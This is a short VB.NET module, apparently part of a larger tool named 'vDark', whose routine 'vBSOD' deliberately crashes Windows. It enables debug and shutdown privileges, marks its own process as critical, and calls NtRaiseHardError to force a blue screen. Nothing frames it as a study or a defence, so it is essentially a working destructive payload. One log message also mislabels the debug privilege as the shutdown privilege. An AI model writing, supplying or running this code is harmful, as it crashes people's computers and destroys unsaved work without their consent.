Module vDark
    Public Declare Ansi Function RtlAdjustPrivilege Lib "ntdll.dll" (ByVal Privilege As Integer, ByVal Enable As Boolean, ByVal Client As Boolean, ByRef WasEnabled As Integer) As Integer
    Public Declare Ansi Function RtlSetProcessIsCritical Lib "ntdll.dll" (ByVal NewValue As Integer, ByVal Value As Integer, ByVal WinLogon As Integer) As Integer
    Public Declare Ansi Function NtRaiseHardError Lib "ntdll.dll" (ByVal ErrorStatus As Integer, ByVal NumberOfParameters As Integer, ByVal UnicodeStringParameterMask As Integer, ByVal Parameters As Integer, ByVal ValidResponseOption As Integer, ByRef Response As Integer) As UInteger
    Public Sub vBSOD()

        'SeDebugPrivilege = 0x14 = 20
        If RtlAdjustPrivilege(20, True, False, 0) = 0 Then vMSG.TextBox1.AppendText("[OK]RtlAdjustPrivilege SeShutdownPrivilege" & vbCrLf)
        If RtlSetProcessIsCritical(1, 0, 0) = 0 Then vMSG.TextBox1.AppendText("[OK]RtlSetProcessIsCritical" & vbCrLf)

        'SeShutdown_Privilege = 0x13 = 19
        If RtlAdjustPrivilege(19, True, False, 0) = 0 Then vMSG.TextBox1.AppendText("[OK]RtlAdjustPrivilege SeShutdownPrivilege" & vbCrLf)
        NtRaiseHardError(&HC000021A, 4, 1, 0, 6, 0)
        Application.Exit()
    End Sub
End Module
